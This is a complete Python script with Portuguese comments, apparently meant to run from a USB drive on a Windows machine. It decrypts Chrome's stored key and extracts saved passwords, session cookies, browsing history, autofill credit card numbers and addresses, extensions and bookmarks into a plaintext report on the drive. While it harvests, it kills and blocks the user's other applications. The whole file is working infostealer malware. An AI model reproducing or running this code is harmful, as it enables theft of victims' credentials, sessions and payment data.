import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import subprocess
import win32crypt
import threading
import psutil
from Crypto.Cipher import AES
from datetime import datetime

# =============================================
# LOG DE INICIALIZAÇÃO (ESCREVE NA RAIZ DO PENDRIVE)
# =============================================
try:
    with open(os.path.join(os.path.dirname(__file__), "iniciou.txt"), "w") as f:
        f.write("Programa iniciou!\n")
        f.write(f"PID: {os.getpid()}\n")
        f.write(f"Caminho: {__file__}\n")
except Exception as e:
    desktop = os.path.join(os.environ.get('USERPROFILE', 'C:/'), 'Desktop')
    try:
        with open(os.path.join(desktop, "iniciou_fallback.txt"), "w") as f:
            f.write(f"Erro ao escrever no pendrive: {e}")
    except:
        pass

# =============================================
# CONFIGURAÇÕES INICIAIS
# =============================================
USUARIO = os.getlogin()
PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")
os.makedirs(PASTA_SAIDA, exist_ok=True)

LOG_FILE = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
stop_block = threading.Event()

def log(texto):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(str(texto) + "\n")
    except:
        pass
    try:
        print(texto)
    except:
        pass

# =============================================
# PROCESSOS PERMITIDOS (NUNCA SERÃO MORTO)
# =============================================
PROCESSOS_PERMITIDOS = [
    'system', 'smss.exe', 'csrss.exe', 'wininit.exe', 'services.exe',
    'lsass.exe', 'svchost.exe', 'winlogon.exe', 'explorer.exe',
    'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'conhost.exe',
    'dwm.exe', 'ctfmon.exe', 'coletor.exe', 'python.exe'
]

def matar_processos_existentes():
    log("[BLOQUEIO] Fechando aplicativos abertos...")
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            nome = proc.info['name'].lower()
            user = proc.info['username'] or ''
            if (user and USUARIO in user) and nome not in [p.lower() for p in PROCESSOS_PERMITIDOS]:
                proc.kill()
                log(f"    Fechou: {nome} (PID {proc.info['pid']})")
                time.sleep(0.1)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    log("[BLOQUEIO] Processos iniciais fechados.")

def ativar_bloqueio():
    log("[BLOQUEIO] Ativando bloqueio...")
    matar_processos_existentes()

    def loop_bloqueio():
        while not stop_block.is_set():
            try:
                if not os.path.exists(PASTA_ATUAL):
                    log("[BLOQUEIO] Pendrive removido. Desativando.")
                    stop_block.set()
                    break

                for proc in psutil.process_iter(['pid', 'name', 'username', 'create_time']):
                    try:
                        nome = proc.info['name'].lower()
                        user = proc.info['username'] or ''
                        if (user and USUARIO in user) and nome not in [p.lower() for p in PROCESSOS_PERMITIDOS]:
                            if time.time() - proc.info['create_time'] < 2:
                                proc.kill()
                                log(f"    Bloqueou: {nome} (PID {proc.info['pid']})")
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
            except Exception as e:
                log(f"    Erro no loop: {e}")
            time.sleep(0.5)

    thread = threading.Thread(target=loop_bloqueio, daemon=True)
    thread.start()
    log("[BLOQUEIO] Ativado. Ctrl+Shift+Esc ou remover pendrive para desativar.")
    return thread

def desativar_bloqueio():
    log("[BLOQUEIO] Desativando...")
    stop_block.set()
    log("[BLOQUEIO] Desativado.")

# =============================================
# HOTKEY PARA DESBLOQUEAR
# =============================================
def iniciar_hotkey():
    try:
        import keyboard
        keyboard.add_hotkey('ctrl+shift+esc', lambda: stop_block.set())
        log("[HOTKEY] Ctrl+Shift+Esc configurado.")
    except ImportError:
        log("[HOTKEY] Biblioteca 'keyboard' não encontrada.")
    except Exception as e:
        log(f"[HOTKEY] Erro: {e}")

# =============================================
# FUNÇÕES DE COLETA
# =============================================
def pegar_chave():
    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Local State"
    if not os.path.exists(path):
        raise FileNotFoundError(f"Chrome não encontrado: {path}")
    with open(path, 'r') as f:
        local = json.load(f)
    chave_enc = base64.b64decode(local["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(chave_enc, None, None, None, 0)[1]

def coletar_senhas(chave):
    log("  [SENHAS] ...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    if not os.path.exists(caminho):
        return ["Chrome não possui dados de login."]
    temp = os.path.join(PASTA_SAIDA, "temp.db")
    shutil.copyfile(caminho, temp)
    creds = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for url, user, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            senha = aes.decrypt_and_verify(cipher, tag).decode()
            creds.append(f"URL: {url}\nUsuário: {user}\nSenha: {senha}\n")
        except:
            pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(creds)} senhas.")
    return creds

def coletar_cookies(chave):
    log("  [COOKIES] ...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
    if not os.path.exists(caminho):
        return []
    temp = os.path.join(PASTA_SAIDA, "cookies_temp.db")
    shutil.copyfile(caminho, temp)
    cookies = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    for host, nome, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            valor = aes.decrypt_and_verify(cipher, tag).decode()
            cookies.append(f"Host: {host}\nCookie: {nome}={valor}\n")
        except:
            pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(cookies)} cookies.")
    return cookies

def coletar_historico():
    log("  [HISTORICO] ...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/History"
    if not os.path.exists(caminho):
        return []
    temp = os.path.join(PASTA_SAIDA, "history_temp.db")
    shutil.copyfile(caminho, temp)
    hist = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
    for url, titulo in cursor.fetchall():
        hist.append(f"URL: {url}\nTítulo: {titulo}\n")
    conn.close()
    os.remove(temp)
    log(f"    OK {len(hist)} sites.")
    return hist

def coletar_autofill():
    log("  [AUTOFILL] ...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
    if not os.path.exists(caminho):
        return []
    temp = os.path.join(PASTA_SAIDA, "web_temp.db")
    shutil.copyfile(caminho, temp)
    dados = []
    conn = sqlite3.connect(temp)
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        for nome, mes, ano, enc in cursor.fetchall():
            try:
                num = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
                dados.append(f"CARTÃO: {nome} | {mes}/{ano} | {num}")
            except:
                pass
    except:
        pass
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT full_name, street_address, city, state, zipcode FROM autofill_profiles")
        for nome, rua, cidade, estado, cep in cursor.fetchall():
            dados.append(f"ENDEREÇO: {nome} | {rua}, {cidade}-{estado} | {cep}")
    except:
        pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(dados)} itens.")
    return dados

def coletar_extensoes():
    log("  [EXTENSOES] ...")
    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Extensions"
    if not os.path.exists(path):
        return ["Nenhuma extensão encontrada."]
    ext = []
    for e in os.listdir(path):
        try:
            manifest = os.path.join(path, e, "manifest.json")
            if os.path.exists(manifest):
                with open(manifest, 'r') as f:
                    data = json.load(f)
                    nome = data.get("name", e)
                    ext.append(f"  {nome} ({e})")
        except:
            ext.append(f"  {e}")
    log(f"    OK {len(ext)} extensões.")
    return ext

def coletar_favoritos():
    log("  [FAVORITOS] ...")
    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Bookmarks"
    if not os.path.exists(path):
        return []
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    favs = []
    def extrair(node, pasta=""):
        if "children" in node:
            for child in node["children"]:
                if child.get("type") == "url":
                    favs.append(f"{pasta}/{child.get('name','')} -> {child.get('url','')}")
                elif child.get("type") == "folder":
                    extrair(child, pasta + "/" + child.get("name",""))
    extrair(data.get("roots", {}).get("bookmark_bar", {}))
    extrair(data.get("roots", {}).get("other", {}))
    log(f"    OK {len(favs)} favoritos.")
    return favs

# =============================================
# MAIN
# =============================================
def main():
    log("="*60)
    log("COLETOR MAXIMO + BLOQUEIO TOTAL")
    log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    log(f"Usuário: {USUARIO}")
    log("="*60)

    iniciar_hotkey()
    thread_bloqueio = ativar_bloqueio()

    try:
        log("\n[+] Obtendo chave...")
        chave = pegar_chave()
        log("[OK] Chave obtida.")

        log("\n[+] Coletando dados:")
        dados = {
            "senhas": coletar_senhas(chave),
            "cookies": coletar_cookies(chave),
            "historico": coletar_historico(),
            "autofill": coletar_autofill(),
            "extensoes": coletar_extensoes(),
            "favoritos": coletar_favoritos()
        }

        nome = f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        caminho = os.path.join(PASTA_SAIDA, nome)
        with open(caminho, "w", encoding="utf-8") as f:
            f.write("="*80 + "\n")
            f.write("RELATORIO COMPLETO\n")
            f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
            f.write(f"Usuario: {USUARIO}\n")
            f.write("="*80 + "\n\n")
            for secao, itens in dados.items():
                f.write(f"[{secao.upper()}]\n")
                f.write("-"*40 + "\n")
                if itens:
                    for item in itens:
                        f.write(item + "\n")
                else:
                    f.write("Nenhum dado encontrado.\n")
                f.write("\n")

        shutil.copy(caminho, os.path.join(PASTA_ATUAL, nome))
        log(f"\n[OK] Relatório salvo em: {caminho}")
        log(f"[OK] Cópia na raiz: {nome}")

    except FileNotFoundError as e:
        log(f"[ERRO] {e}")
        with open(os.path.join(PASTA_SAIDA, "chrome_nao_encontrado.txt"), "w") as f:
            f.write(str(e))
    except Exception as e:
        log(f"[ERRO] {e}")
        import traceback
        log(traceback.format_exc())
    finally:
        log("\n[!] Bloqueio ativo. Pressione Ctrl+Shift+Esc ou remova o pendrive para desativar.")
        while not stop_block.is_set():
            time.sleep(1)
        desativar_bloqueio()
        if thread_bloqueio.is_alive():
            thread_bloqueio.join(timeout=2)

    log("\n" + "="*60)
    log("FIM")
    time.sleep(3)

if __name__ == "__main__":
    main()
